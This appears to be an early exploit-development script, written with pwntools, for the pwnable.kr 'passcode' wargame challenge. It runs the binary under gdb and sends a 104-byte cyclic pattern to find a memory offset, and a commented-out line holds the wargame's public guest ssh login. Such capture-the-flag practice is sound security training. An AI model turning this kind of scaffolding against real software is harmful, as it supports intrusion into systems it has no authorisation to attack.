from pwn import *

context(terminal=['tmux','new-window'])
# s = ssh(user='passcode', host='pwnable.kr', port=2222, password='guest')
# p = s.process('./passcode')
p = gdb.debug('./passcode','b *login+19')

buf = b''
buf += cyclic(104)

p.sendline(buf)
p.interactive()
